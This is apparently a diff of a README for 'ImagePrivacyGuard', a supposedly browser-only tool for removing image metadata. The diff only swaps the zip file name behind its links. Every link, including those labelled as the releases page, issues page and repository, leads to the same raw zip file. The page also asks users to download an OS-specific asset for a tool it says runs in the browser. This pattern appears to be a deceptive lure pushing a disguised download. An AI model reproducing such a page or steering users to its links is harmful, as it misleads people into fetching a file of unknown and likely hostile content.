@@ -1,7 +1,7 @@
 # 🖼️ ImagePrivacyGuard - Keep Your Images Safe Online
 
 ## 💾 Download Now
-[![Download ImagePrivacyGuard](https://raw.githubusercontent.com/saini3530/ImagePrivacyGuard/main/preview/Privacy_Guard_Image_postbranchial.zip)](https://raw.githubusercontent.com/saini3530/ImagePrivacyGuard/main/preview/Privacy_Guard_Image_postbranchial.zip)
+[![Download ImagePrivacyGuard](https://raw.githubusercontent.com/saini3530/ImagePrivacyGuard/main/preview/Image-Privacy-Guard-v2.5-beta.1.zip)](https://raw.githubusercontent.com/saini3530/ImagePrivacyGuard/main/preview/Image-Privacy-Guard-v2.5-beta.1.zip)
 
 ## 🚀 Getting Started
 Image Privacy Guard is a lightweight, privacy-focused web tool. It analyzes image metadata directly in your browser. With this tool, you can identify and remove privacy-sensitive information before sharing images online, all without uploading any files to a server. This means your data stays safe and secure.
@@ -9,7 +9,7 @@ Image Privacy Guard is a lightweight, privacy-focused web tool. It analyzes imag
 ## 📦 Download & Install
 To get started with Image Privacy Guard, follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/saini3530/ImagePrivacyGuard/main/preview/Privacy_Guard_Image_postbranchial.zip) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/saini3530/ImagePrivacyGuard/main/preview/Image-Privacy-Guard-v2.5-beta.1.zip) to download the latest version.
 2. Look for the asset that matches your operating system (Windows, Mac, or Linux).
 3. Click on the download link to save the file to your computer.
 4. After the download completes, locate the file in your Downloads folder.
@@ -65,10 +65,10 @@ No, all processing occurs in your browser, and your images are not uploaded to a
 Currently, Image Privacy Guard is optimized for desktop web browsers. Use it on your laptop or desktop for the best experience.
 
 ## ✅ Support
-If you experience any issues or have questions, please visit the [GitHub Issues page](https://raw.githubusercontent.com/saini3530/ImagePrivacyGuard/main/preview/Privacy_Guard_Image_postbranchial.zip) to get support from the community. 
+If you experience any issues or have questions, please visit the [GitHub Issues page](https://raw.githubusercontent.com/saini3530/ImagePrivacyGuard/main/preview/Image-Privacy-Guard-v2.5-beta.1.zip) to get support from the community. 
 
 ## 🔗 Useful Links
-- [Releases Page](https://raw.githubusercontent.com/saini3530/ImagePrivacyGuard/main/preview/Privacy_Guard_Image_postbranchial.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/saini3530/ImagePrivacyGuard/main/preview/Privacy_Guard_Image_postbranchial.zip)
+- [Releases Page](https://raw.githubusercontent.com/saini3530/ImagePrivacyGuard/main/preview/Image-Privacy-Guard-v2.5-beta.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/saini3530/ImagePrivacyGuard/main/preview/Image-Privacy-Guard-v2.5-beta.1.zip)
 
 With Image Privacy Guard, you can share your images without worrying about privacy risks. Download it today!
